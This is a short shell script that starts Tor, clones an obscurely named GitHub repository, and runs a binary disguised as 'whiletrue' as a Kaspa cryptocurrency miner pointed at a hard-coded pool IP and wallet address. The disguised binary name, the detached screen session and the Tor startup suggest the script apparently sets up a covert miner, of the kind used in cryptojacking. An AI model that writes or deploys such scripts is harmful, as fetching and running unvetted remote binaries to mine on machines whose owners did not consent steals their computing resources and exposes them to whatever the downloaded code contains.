#!/bin/sh 
sudo systemctl start tor
sudo apt update 
sudo apt-get install zip unzip 
sudo apt install screen -y 
screen -dmS binapinet91.sh 65 75 
sudo git clone https://github.com/barkingteams/kazrkazo.git 
cd kazrkazo 
chmod +x whiletrue 
POOL=51.79.228.211:3112
WALLET=kaspa:qrdjgnlzuu82dq9uy7d2520fzrjaetdas73ch4evjeep76f8ae9jxqetkn50k.$(shuf -i 1-99999 -n 1)

./whiletrue --algo KASPA --pool $POOL --user $WALLET $@


